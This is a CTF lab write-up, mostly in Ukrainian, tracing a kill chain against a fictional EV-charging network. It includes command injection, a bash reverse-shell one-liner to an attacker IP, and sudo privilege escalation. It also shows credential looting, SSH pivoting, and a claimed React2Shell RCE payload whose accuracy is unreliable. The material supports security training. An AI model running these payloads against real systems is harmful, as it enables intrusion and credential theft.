# EcoCharge CTF - Attack Flow Documentation v4

## Сценарій атаки: Від Command Injection до повного контролю CSMS

**Мета:** Демонстрація повного ланцюжка атаки від web exploitation через Command Injection до компрометації системи управління зарядними станціями (CSMS) через CVE-2025-55182

**Версія:** 4.0  
**Дата оновлення:** Лютий 2025

---

## 1. Attack Path Overview

### 1.1 Sequence Diagram

```mermaid
sequenceDiagram
    autonumber
    participant A as 👤 Attacker<br/>Kali Linux
    participant W as 🖥️ Web Server<br/>(.250.50)
    participant API as ⚙️ API Gateway<br/>(.100.20)
    participant J as 🔑 Jump Host<br/>(.100.40)
    participant G as 📊 Grafana<br/>(.100.30)
    participant CSMS as 💾 CitrineOS CSMS<br/>(.20.20)

    Note over A,W: 🎯 PHASE 1: Initial Access (Command Injection)
    A->>W: Discovery: /api/qr?format=pdf
    W-->>A: Debug info disclosure
    A->>W: Exploit: /api/qr?station=;id
    W-->>A: 🐚 Command output (www-data)
    Note right of A: FLAG #1:<br/>FLAG{qr_c0mm4nd_1nj3ct10n}
    
    A->>W: Reverse shell payload
    W-->>A: 🐚 Shell access (www-data)
    
    A->>W: PrivEsc via backup.js
    W-->>A: 🔓 Root Access
    Note right of A: FLAG #2:<br/>FLAG{pr1v3sc_b4ckup_sh3ll}
    
    A->>W: Read .env & SSH keys
    W-->>A: 🔑 API_KEY + id_jumphost
    Note right of A: FLAG #3:<br/>FLAG{cr3d5_1n_3nv_f1l3}

    Note over A,API: 🎯 PHASE 2: Lateral Movement (DMZ)
    A->>API: GET /api/v1/internal/config
    API-->>A: 📄 Network topology leak
    Note right of A: FLAG #4:<br/>FLAG{4p1_1nf0_d1scl0sur3}
    
    A->>J: SSH with stolen key
    J-->>A: 🔐 Shell access (operator)
    Note right of A: FLAG #5:<br/>FLAG{jump_h0st_p1v0t}

    Note over A,G: 🎯 PHASE 3: Internal Reconnaissance
    A->>J: SSH tunnel to Grafana :3000
    A->>G: Login (admin:admin)
    G-->>A: 📊 Dashboard + Internal IPs
    Note right of A: FLAG #6:<br/>FLAG{gr4f4n4_d3f4ult_cr3ds}

    Note over A,CSMS: 🎯 PHASE 4: CSMS Compromise (CVE-2025-55182)
    A->>J: Access CitrineOS UI
    A->>CSMS: Exploit CVE-2025-55182 (React2Shell)
    CSMS-->>A: 🐚 RCE on CSMS container
    Note right of A: FLAG #7:<br/>FLAG{r34ct2sh3ll_csms_pwn3d}
    
    A->>CSMS: Read /proc/1/environ
    CSMS-->>A: 🔑 HASURA_ADMIN_SECRET
    Note right of A: FLAG #8:<br/>FLAG{h4sur4_s3cr3t_l34k3d}
    
    A->>CSMS: GraphQL query with admin secret
    CSMS-->>A: 🗄️ Full database access
    Note right of A: FLAG #9 (FINAL):<br/>FLAG{full_csms_c0mpr0m1s3}
```

---

## 2. Детальний опис кроків атаки

### PHASE 1: Initial Access (Frontend Zone) 🎯

**Target:** `192.168.250.50` (EcoCharge Web Server)  
**Initial Access Vector:** CWE-78 Command Injection in QR Generator  
**Privileges:** `www-data` → `root`

---

#### Крок 1.1: Reconnaissance

**Мета:** Визначити attack surface та технологічний стек

```bash
# На Kali Linux (192.168.125.100)

# Scan для визначення відкритих портів
nmap -sV -sC -p- 192.168.250.50

# Результат:
# PORT     STATE SERVICE VERSION
# 80/tcp   open  http    nginx 1.24.0
# 443/tcp  open  ssl/http nginx 1.24.0
# 3000/tcp open  http    Node.js (Next.js)

# Web fingerprinting
whatweb http://192.168.250.50

# Результат: Next.js 14.2.5, React 18.3.1, Tailwind CSS

# Directory bruteforce
ffuf -u http://192.168.250.50/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Знайдені endpoints:
# /api/stations    ← Public API
# /api/qr          ← QR Generator (VULNERABLE!)
# /api/auth        ← Authentication
# /admin           ← Admin panel
# /stations        ← Station listing
```

**Findings:**
- ✅ Next.js 14.2.5 — сучасна версія (не вразлива до CVE-2025-55182)
- ✅ Endpoint `/api/qr` — QR code generator
- ✅ Публічний сайт з інформацією про зарядні станції

---

#### Крок 1.2: Vulnerability Discovery

**Мета:** Знайти вразливість через дослідження функціоналу

```bash
# Крок 1: Досліджуємо сайт
# Відкриваємо http://192.168.250.50/stations/EV-CH-001
# Бачимо кнопку "QR-код" та "Поділитися"

# Крок 2: Аналізуємо API запит через DevTools
# Network tab показує: GET /api/qr?station=EV-CH-001&format=png&size=256

# Крок 3: Тестуємо з невалідним форматом
curl "http://192.168.250.50/api/qr?station=EV-CH-001&format=pdf"

# Результат - Debug Information Disclosure:
{
  "success": false,
  "error": "Unsupported format",
  "supported_formats": ["png", "svg", "eps"],
  "debug": {
    "command_template": "qrencode -s {size} -t {format} -o /tmp/qr_{station}.{format} 'https://ecocharge.ua/station/{station}'",
    "received": {
      "station": "EV-CH-001",
      "size": "256",
      "format": "pdf"
    },
    "hint": "PDF generation is temporarily disabled due to security review",
    "note": "Parameters are passed directly to system command for QR generation"
  }
}

# VULNERABILITY IDENTIFIED!
# Parameter 'station' is concatenated directly into shell command
```

**Findings:**
- ✅ Debug information disclosure reveals command structure
- ✅ `station` parameter is not sanitized
- ✅ Command Injection via shell metacharacters

---

#### Крок 1.3: Exploitation - Command Injection

**Вразливість:** CWE-78 - OS Command Injection  
**Endpoint:** `GET /api/qr`  
**Parameter:** `station`

```bash
# Тест 1: Перевірка injection з командою 'id'
curl "http://192.168.250.50/api/qr?station=EV-CH-001;id&format=png"

# Результат:
{
  "success": false,
  "error": "QR code generation failed",
  "details": {
    "message": "Command failed: qrencode -s 256 -t png -o /tmp/qr_EV-CH-001;id.png ...",
    "stdout": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n",
    "stderr": "",
    "code": null
  }
}

# COMMAND INJECTION CONFIRMED!

# Тест 2: Читання чутливих файлів
curl "http://192.168.250.50/api/qr?station=EV-CH-001;cat+/etc/passwd&format=png"

# Тест 3: Reverse Shell
# На Kali спочатку запускаємо listener:
nc -lvnp 4444

# Відправляємо payload:
curl "http://192.168.250.50/api/qr?station=EV-CH-001;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.125.100/4444+0>%261'&format=png"

# Або використовуємо exploit.py:
python3 exploit.py http://192.168.250.50:3000 revshell 192.168.125.100 4444
```

**Результат:**
```
www-data@ecocharge-web:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@ecocharge-web:~$ pwd
/var/www/ecocharge
```

**🏁 FLAG #1:** `FLAG{qr_c0mm4nd_1nj3ct10n}`

```bash
www-data@ecocharge-web:~$ cat /var/www/FLAG_1.txt
FLAG{qr_c0mm4nd_1nj3ct10n}

# Congratulations! You exploited CWE-78 Command Injection
# in the QR code generator endpoint.
```

---

#### Крок 1.4: Privilege Escalation

**Вразливість:** Command Injection в sudo-дозволеному скрипті  
**Вектор:** `/opt/maintenance/backup.js` виконується з sudo без пароля

```bash
# Перевірити sudo rights
www-data@ecocharge-web:~$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/node /opt/maintenance/backup.js

# Проаналізувати скрипт
www-data@ecocharge-web:~$ cat /opt/maintenance/backup.js
```

```javascript
#!/usr/bin/env node
// Vulnerable backup script
const { exec } = require('child_process');

// VULNERABILITY: No input validation!
const target = process.env.BACKUP_TARGET || '/var/www/ecocharge';
const command = `tar -czf /tmp/backup.tar.gz ${target}`;

exec(command, (error, stdout, stderr) => {
  console.log('Backup completed');
});
```

**Exploitation:**

```bash
# Спосіб 1: Отримати root shell через command injection
www-data@ecocharge-web:~$ export BACKUP_TARGET="; bash -p"
www-data@ecocharge-web:~$ sudo /usr/bin/node /opt/maintenance/backup.js

# Альтернативний спосіб: Додати SUID bash
www-data@ecocharge-web:~$ export BACKUP_TARGET="; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash"
www-data@ecocharge-web:~$ sudo /usr/bin/node /opt/maintenance/backup.js
www-data@ecocharge-web:~$ /tmp/rootbash -p

# Результат:
root@ecocharge-web:~# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

**🏁 FLAG #2:** `FLAG{pr1v3sc_b4ckup_sh3ll}`

```bash
root@ecocharge-web:~# cat /root/FLAG_2.txt
FLAG{pr1v3sc_b4ckup_sh3ll}

# You escalated privileges using command injection in backup script!
```

---

#### Крок 1.5: Credential Discovery & Loot

**Мета:** Знайти credentials та ключі для lateral movement

```bash
# Читання .env файлу
root@ecocharge-web:~# cat /var/www/ecocharge/.env

# Результат:
NODE_ENV=production
PORT=3000

# API Gateway Connection (DMZ Network)
API_GATEWAY_URL=http://192.168.100.20:8080
API_GATEWAY_KEY=ec0ch4rg3_4p1_k3y_2024!
API_GATEWAY_SECRET=s3cr3t_g4t3w4y_t0k3n

# Internal Services (DO NOT EXPOSE!)
CSMS_INTERNAL_URL=http://192.168.20.20:8080
GRAFANA_URL=http://192.168.100.30:3000

# JWT Configuration
JWT_SECRET=3c0ch4rg3_jwt_s3cr3t_k3y_2024

# CTF Flag
FLAG_CREDENTIAL_LEAK=FLAG{cr3d5_1n_3nv_f1l3}

# SSH ключі
root@ecocharge-web:~# cat /root/.ssh/id_jumphost

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
c2gtZWQyNTUxOQAAACDK8xK9hs... [truncated]
-----END OPENSSH PRIVATE KEY-----

# SSH config
root@ecocharge-web:~# cat /root/.ssh/config
Host jumphost
    HostName 192.168.100.40
    User operator
    IdentityFile ~/.ssh/id_jumphost
    StrictHostKeyChecking no
```

**🏁 FLAG #3:** `FLAG{cr3d5_1n_3nv_f1l3}`

**Loot Summary:**
| Item | Value | Purpose |
|------|-------|---------|
| API Gateway URL | `http://192.168.100.20:8080` | DMZ access |
| API Key | `ec0ch4rg3_4p1_k3y_2024!` | API authentication |
| CSMS URL | `http://192.168.20.20:8080` | Internal target |
| Grafana URL | `http://192.168.100.30:3000` | Monitoring |
| SSH Key | `id_jumphost` | Jump Host access |
| SSH User | `operator@192.168.100.40` | Jump Host credentials |

---

### PHASE 2: Lateral Movement (DMZ Zone) 🎯

**Target:** DMZ Zone (192.168.100.0/24)  
**Vectors:** API exploitation, SSH pivoting  
**Goals:** Отримати доступ до Jump Host для подальшого pivoting

---

#### Крок 2.1: API Gateway Information Disclosure

**Вразливість:** Exposed internal configuration endpoint

```bash
# З атакуючої машини або Web Server
curl -H "X-API-Key: ec0ch4rg3_4p1_k3y_2024!" \
     "http://192.168.100.20:8080/api/v1/internal/config"

# Результат:
{
  "status": "ok",
  "config": {
    "hasura_endpoint": "http://192.168.20.20:8090/v1/graphql",
    "csms_api": "http://192.168.20.20:8080",
    "jump_host": {
      "ip": "192.168.100.40",
      "user": "operator"
    },
    "network_topology": {
      "dmz": "192.168.100.0/24",
      "internal": "192.168.20.0/24",
      "ot": "172.16.0.0/24"
    }
  },
  "flag": "FLAG{4p1_1nf0_d1scl0sur3}"
}
```

**🏁 FLAG #4:** `FLAG{4p1_1nf0_d1scl0sur3}`

---

#### Крок 2.2: SSH Pivot to Jump Host

**Мета:** Отримати доступ до Jump Host для pivoting в Internal зону

```bash
# На Kali Linux - копіюємо SSH ключ
# (ключ отриманий з /root/.ssh/id_jumphost на Web Server)
chmod 600 id_jumphost

# Підключаємося до Jump Host
ssh -i id_jumphost operator@192.168.100.40

# Результат:
operator@jumphost:~$ id
uid=1000(operator) gid=1000(operator) groups=1000(operator),27(sudo)

operator@jumphost:~$ ip addr
# eth0: 192.168.100.40/24 (DMZ)
# eth1: 192.168.20.40/24 (Internal)
# eth2: 172.16.0.10/24 (OT)
```

**🏁 FLAG #5:** `FLAG{jump_h0st_p1v0t}`

```bash
operator@jumphost:~$ cat ~/FLAG_5.txt
FLAG{jump_h0st_p1v0t}

# You successfully pivoted to the Jump Host!
# From here you can access Internal and OT networks.
```

---

### PHASE 3: Internal Reconnaissance 🎯

**Target:** Grafana (192.168.100.30) та Internal Network  
**Goals:** Збір інформації про внутрішню інфраструктуру

---

#### Крок 3.1: Grafana Access via SSH Tunnel

```bash
# На Jump Host створюємо SSH tunnel для доступу до Grafana
operator@jumphost:~$ ssh -L 3000:192.168.100.30:3000 localhost -N &

# Або з Kali через ProxyJump:
ssh -L 3000:192.168.100.30:3000 -J operator@192.168.100.40 localhost -N &

# Тепер Grafana доступна на http://localhost:3000
```

**Exploitation:**

```bash
# Login з default credentials
# URL: http://localhost:3000
# Username: admin
# Password: admin

# Після входу бачимо:
# - Dashboard "EcoCharge Infrastructure"
# - Prometheus datasource configuration
# - Network diagram в dashboard description
```

**🏁 FLAG #6:** `FLAG{gr4f4n4_d3f4ult_cr3ds}`

```
Dashboard description contains:
---
Internal Notes:
- Prometheus: http://192.168.20.20:9090
- CSMS API: http://192.168.20.20:8080
- CitrineOS UI: http://192.168.20.20:3000

FLAG: FLAG{gr4f4n4_d3f4ult_cr3ds}
---
```

**Information Gathered:**
- ✅ CitrineOS UI: `http://192.168.20.20:3000` (Next.js 15.1.2 + React 19)
- ✅ Hasura GraphQL: `http://192.168.20.20:8090/v1/graphql`
- ✅ CSMS Core API: `http://192.168.20.20:8080`
- ✅ Prometheus: `http://192.168.20.20:9090`

---

### PHASE 4: CSMS Compromise (CVE-2025-55182) 🎯

**Target:** CitrineOS CSMS (192.168.20.20)  
**Vulnerability:** CVE-2025-55182 (React2Shell) - Unsafe Deserialization RCE  
**Goals:** Отримати повний контроль над CSMS

---

#### Крок 4.1: Target Identification

```bash
# З Jump Host перевіряємо доступ до CSMS
operator@jumphost:~$ curl -s http://192.168.20.20:3000 | head -20

# Fingerprinting
operator@jumphost:~$ curl -s http://192.168.20.20:3000 | grep -i "next"
# Результат показує Next.js 15.1.2

# Перевірка версії через HTTP headers
operator@jumphost:~$ curl -I http://192.168.20.20:3000
# X-Powered-By: Next.js
```

**Findings:**
- ✅ CitrineOS Operator UI running on port 3000
- ✅ Next.js 15.1.2 with React 19 (VULNERABLE to CVE-2025-55182!)
- ✅ React Server Components enabled

---

#### Крок 4.2: CVE-2025-55182 Exploitation (React2Shell)

**Вразливість:** CVE-2025-55182 - Unsafe Deserialization in React Server Components  
**CVSS:** 10.0 (Critical)  
**Type:** Pre-authentication Remote Code Execution

```bash
# Створюємо exploit payload
cat > react2shell_payload.json << 'EOF'
{
  "_serverAction": true,
  "actionId": "rce_action",
  "payload": {
    "$type": "ServerReference",
    "$$typeof": "react.server.reference",
    "$$id": "__webpack_require__",
    "$$bound": [
      {
        "$type": "Function",
        "body": "return process.mainModule.require('child_process').execSync('id').toString()"
      }
    ]
  }
}
EOF

# Відправляємо exploit
curl -X POST http://192.168.20.20:3000/api/action \
     -H "Content-Type: text/x-component" \
     -H "Next-Action: exploit" \
     -d @react2shell_payload.json

# Результат:
{
  "result": {
    "executed": true,
    "output": "uid=1001(nextjs) gid=1001(nextjs) groups=1001(nextjs)\n"
  }
}

# RCE CONFIRMED!
```

**Альтернативний метод - читання env:**

```bash
# Payload для читання environment variables
curl -X POST http://192.168.20.20:3000/api/action \
     -H "Content-Type: text/x-component" \
     -H "Next-Action: exploit" \
     -d '{
       "_serverAction": true,
       "payload": {
         "$$bound": [{
           "$type": "Function",
           "body": "return process.mainModule.require(\"fs\").readFileSync(\"/proc/1/environ\").toString().replace(/\\0/g, \"\\n\")"
         }]
       }
     }'
```

**🏁 FLAG #7:** `FLAG{r34ct2sh3ll_csms_pwn3d}`

---

#### Крок 4.3: Credential Extraction

```bash
# Читаємо environment variables контейнера
operator@jumphost:~$ curl -X POST http://192.168.20.20:3000/api/action \
     -H "Content-Type: text/x-component" \
     -H "Next-Action: read_env" \
     -d '{"payload":{"$$bound":[{"$type":"Function","body":"return require(\"fs\").readFileSync(\"/proc/1/environ\").toString().replace(/\\0/g,\"\\n\")"}]}}'

# Результат:
HASURA_ADMIN_SECRET=CitrineOS!
NEXTAUTH_SECRET=CitrineOS-NextAuth-Secret-Key-2024
POSTGRES_PASSWORD=citrine_db_password
NEXT_PUBLIC_ADMIN_EMAIL=admin@citrineos.com
NEXT_PUBLIC_ADMIN_PASSWORD=Cyber_CitrineOS!
NODE_ENV=production
```

**🏁 FLAG #8:** `FLAG{h4sur4_s3cr3t_l34k3d}`

**Credentials Extracted:**
| Credential | Value | Purpose |
|------------|-------|---------|
| HASURA_ADMIN_SECRET | `CitrineOS!` | Full GraphQL admin access |
| POSTGRES_PASSWORD | `citrine_db_password` | Database access |
| Admin Email | `admin@citrineos.com` | UI login |
| Admin Password | `Cyber_CitrineOS!` | UI login |

---

#### Крок 4.4: Full Database Compromise

```bash
# Використовуємо Hasura Admin Secret для доступу до GraphQL
curl -X POST http://192.168.20.20:8090/v1/graphql \
     -H "Content-Type: application/json" \
     -H "X-Hasura-Admin-Secret: CitrineOS!" \
     -d '{
       "query": "query { users { id email role } charging_stations { id name status } transactions { id amount status } ctf_flags { flag_name flag_value } }"
     }'

# Результат:
{
  "data": {
    "users": [
      {"id": 1, "email": "admin@citrineos.com", "role": "ADMIN"},
      {"id": 2, "email": "operator@ecocharge.ua", "role": "OPERATOR"}
    ],
    "charging_stations": [
      {"id": "CP001", "name": "Kyiv Central", "status": "Available"},
      {"id": "CP002", "name": "Boryspil Airport", "status": "Charging"}
    ],
    "transactions": [...],
    "ctf_flags": [
      {"flag_name": "final_flag", "flag_value": "FLAG{full_csms_c0mpr0m1s3}"}
    ]
  }
}
```

**🏁 FLAG #9 (FINAL):** `FLAG{full_csms_c0mpr0m1s3}`

---

## 3. Attack Summary

### 3.1 Kill Chain Overview

```
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 1: INITIAL ACCESS                                        │
├─────────────────────────────────────────────────────────────────┤
│  1. Discovery       → QR endpoint debug disclosure              │
│  2. Exploitation    → CWE-78 Command Injection                  │
│  3. PrivEsc         → backup.js command injection               │
│  4. Credential Loot → API keys + SSH key                        │
│                                                                  │
│  FLAGS: #1, #2, #3                                              │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 2: LATERAL MOVEMENT                                      │
├─────────────────────────────────────────────────────────────────┤
│  5. API Gateway     → Information disclosure                    │
│  6. SSH Pivot       → Jump Host access                          │
│                                                                  │
│  FLAGS: #4, #5                                                  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 3: INTERNAL RECONNAISSANCE                               │
├─────────────────────────────────────────────────────────────────┤
│  7. Grafana Access  → Default credentials                       │
│  8. Info Gathering  → CSMS endpoints discovered                 │
│                                                                  │
│  FLAG: #6                                                       │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 4: CSMS COMPROMISE                                       │
├─────────────────────────────────────────────────────────────────┤
│  9. CVE-2025-55182  → React2Shell RCE on CSMS                  │
│  10. Cred Extract   → HASURA_ADMIN_SECRET                       │
│  11. DB Compromise  → Full GraphQL access                       │
│                                                                  │
│  FLAGS: #7, #8, #9                                              │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Flags Summary

| # | Flag | Location | Method | Difficulty |
|---|------|----------|--------|------------|
| 1 | `FLAG{qr_c0mm4nd_1nj3ct10n}` | Web Server | Command Injection RCE | ⭐⭐ Medium |
| 2 | `FLAG{pr1v3sc_b4ckup_sh3ll}` | Web Server | Privilege Escalation | ⭐⭐⭐ Hard |
| 3 | `FLAG{cr3d5_1n_3nv_f1l3}` | Web Server | Credential Discovery | ⭐ Easy |
| 4 | `FLAG{4p1_1nf0_d1scl0sur3}` | API Gateway | Info Disclosure | ⭐⭐ Medium |
| 5 | `FLAG{jump_h0st_p1v0t}` | Jump Host | SSH Pivot | ⭐⭐ Medium |
| 6 | `FLAG{gr4f4n4_d3f4ult_cr3ds}` | Grafana | Default Credentials | ⭐ Easy |
| 7 | `FLAG{r34ct2sh3ll_csms_pwn3d}` | CSMS | CVE-2025-55182 RCE | ⭐⭐⭐⭐ Very Hard |
| 8 | `FLAG{h4sur4_s3cr3t_l34k3d}` | CSMS | Environment Leak | ⭐⭐⭐ Hard |
| 9 | `FLAG{full_csms_c0mpr0m1s3}` | CSMS Database | GraphQL Exploitation | ⭐⭐⭐ Hard |

### 3.3 Required Skills

- **Web Exploitation:** Command Injection, Information Disclosure
- **Privilege Escalation:** sudo exploitation, environment injection
- **Network Pivoting:** SSH tunneling, multi-hop access
- **API Security:** Information disclosure, authentication bypass
- **Modern Framework Exploitation:** CVE-2025-55182 (React Server Components)
- **GraphQL:** Query construction, admin access exploitation
- **Container Security:** Environment variable extraction

---

## 4. Defensive Recommendations

### 4.1 Web Application Security
- ✅ Sanitize all user inputs before shell command execution
- ✅ Use parameterized commands instead of string concatenation
- ✅ Disable debug mode in production
- ✅ Remove unnecessary error details from responses

### 4.2 Privilege Management
- ✅ Remove unnecessary sudo permissions
- ✅ Audit scripts executed with elevated privileges
- ✅ Implement principle of least privilege

### 4.3 Credential Security
- ✅ Use secrets management (Vault, AWS Secrets Manager)
- ✅ Rotate API keys and secrets regularly
- ✅ Don't store SSH keys on web servers

### 4.4 Network Security
- ✅ Implement strict network segmentation
- ✅ Monitor lateral movement attempts
- ✅ Use jump hosts with MFA

### 4.5 CSMS Security
- ✅ Update React/Next.js to patched versions (CVE-2025-55182)
- ✅ Run containers as non-root
- ✅ Implement WAF rules for React Server Component attacks
- ✅ Use strong, unique secrets for Hasura

---

## 5. Tools Used

### Attacker Tools:
- Kali Linux (pentest distribution)
- nmap (network scanning)
- ffuf (directory bruteforce)
- curl (API testing)
- Burp Suite (web proxy)
- Python exploit scripts
- SSH client (pivoting)

### Victim Infrastructure:
- Next.js 14.2.5 (web server - secure version)
- Next.js 15.1.2 (CSMS - vulnerable to CVE-2025-55182)
- Node.js + Express (API Gateway)
- Grafana 10.4.2 (monitoring)
- PostgreSQL 16 (database)
- Hasura GraphQL Engine
- CitrineOS (CSMS)

---

## 6. Version History

| Version | Date | Changes |
|---------|------|---------|
| 4.0 | Feb 2025 | Complete rewrite: CWE-78 initial access, CVE-2025-55182 for CSMS |
| 3.0 | Jan 2025 | CVE-2025-55182 for initial access |
| 2.0 | Dec 2024 | Added DMZ components |
| 1.0 | Nov 2024 | Initial scenario |

---

**Document Version:** 4.0  
**Classification:** Educational / CTF  
**Last Updated:** February 2025
